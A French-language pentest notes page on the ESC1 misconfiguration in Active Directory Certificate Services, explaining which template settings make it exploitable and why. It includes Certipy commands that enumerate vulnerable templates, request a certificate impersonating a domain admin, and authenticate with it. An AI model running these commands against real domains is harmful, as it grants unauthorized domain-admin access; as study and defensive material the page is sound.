---
description: >-
  https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
---

# ESC1

## <mark style="color:red;">ESC1 - Vulnérabilité des templates</mark>

Un template est vulnérable à ESC1 si toutes ces conditions sont réunies :

* **Client Authentication** : Activé
* **Template** : Activé
* **Enrollee Supplies Subject** : Activé (l'utilisateur peut définir le sujet)
* **Requires Management Approval** : Désactivé
* **Authorized Signatures Required** : 0

**Impact** : Un utilisateur standard peut demander un certificat pour n'importe quel utilisateur, y compris un administrateur de domaine.

***

### <mark style="color:blue;">Exploitation avec Certipy</mark>

Certipy est un outil Python qui permet d'exploiter les vulnérabilités d'ADCS.

#### <mark style="color:green;">Étape 1 : Énumération des templates vulnérables</mark>

```
certipy find -u 'billy@foobar.com' -p <password> -dc-ip <DC_IP> -vulnerable -enabled
```

#### <mark style="color:green;">Étape 2 : Demande d'un certificat pour un compte privilégié</mark>

```
certipy req -u 'billy@foobar.com' -p '<PASSWORD>' -dc-ip '10.10.1.100' \
-target 'foobar-CA.foobar.com' -ca 'foobar-CA' -template 'FOO_Templ' \
-upn 'DA_Dan@foobar.com'
```

#### <mark style="color:green;">Étape 3 : Utilisation du certificat pour s'authentifier</mark>

```
certipy auth -pfx DA_Dan.pfx
```

***

{% hint style="warning" %}
<mark style="color:green;">**L'origine de la vulnérabilité ESC1**</mark>

La vulnérabilité provient d'une mauvaise configuration des templates de certificats, et non d'un bug logiciel. Voici ce qui se passe:

1. **Rôle normal des certificats**: Normalement, un certificat prouve votre identité dans un environnement Windows. C'est comme une carte d'identité numérique.
2. **Problème de conception**: Le système de certificats Windows (ADCS) permet de créer des templates (modèles) qui définissent qui peut demander des certificats et comment ils sont générés.
3. **La faille spécifique**: Quand un template est configuré avec les options suivantes, il devient vulnérable:
   * **Enrollee Supplies Subject** (L'utilisateur peut définir le sujet): C'est le point critique. Cette option permet à n'importe quel utilisateur autorisé à demander un certificat de spécifier pour QUI ce certificat est créé, au lieu d'être limité à sa propre identité.
   * **Client Authentication** (Authentification client): Permet d'utiliser le certificat pour s'authentifier.
   * Pas d'approbation requise par un administrateur.
4. **Conséquence**: Un utilisateur standard peut demander un certificat en prétendant être un administrateur de domaine. Le système de certificats accepte cette demande sans vérifier correctement si l'utilisateur a le droit de demander un certificat pour quelqu'un d'autre.

***

<mark style="color:green;">**Exemple concret**</mark>

Imaginons:

1. Une entreprise a un template de certificat appelé "FOO\_Templ" avec les options vulnérables activées.
2. Tous les utilisateurs du domaine ont le droit d'utiliser ce template.
3. Bob, un simple utilisateur, demande un certificat pour le compte "[AdminDomaine@entreprise.com](mailto:AdminDomaine@entreprise.com)" en utilisant ce template.
4. Le serveur de certificats (CA) accepte cette demande et délivre un certificat qui "prouve" que Bob est "AdminDomaine".
5. Bob peut maintenant utiliser ce certificat pour s'authentifier auprès du système en tant qu'administrateur de domaine.

C'est comme si, dans la vraie vie, vous pouviez aller à la préfecture et demander une carte d'identité au nom du président, et qu'on vous la délivrait sans vérification!

La vulnérabilité existe donc parce que:

1. Les administrateurs système ont mal configuré les templates
2. Le système de certificats n'applique pas correctement la séparation des privilèges
3. Par défaut, les certificats ont une longue durée de validité (plusieurs années)
{% endhint %}
